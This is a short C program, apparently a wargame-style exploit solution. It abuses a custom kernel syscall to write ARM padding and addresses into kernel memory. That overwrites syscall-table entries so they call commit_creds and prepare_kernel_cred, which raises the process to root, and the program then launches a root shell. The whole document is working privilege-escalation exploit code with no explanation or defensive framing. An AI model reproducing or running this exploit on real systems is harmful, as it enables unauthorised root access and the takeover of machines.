#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>

#define SYS_CALL_TABLE 0x8000e348
#define SYS_upper 223

int main(void)
{
    unsigned int** sct = (unsigned int**)SYS_CALL_TABLE;
    
    syscall(SYS_upper, "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1", 0x8003f560); // MOV R1, R1 pading
    syscall(SYS_upper, "\x60\xf5\x03\x80", &sct[9]); // link = commit_creds
    syscall(SYS_upper, "\x24\xf9\x03\x80", &sct[10]); // unlink = prepare_kernel_cred
    
    syscall(9,syscall(10,0)); // commit_creds(prepare_kernel_cred(0));
    
    system("/bin/sh"); // get root shell
}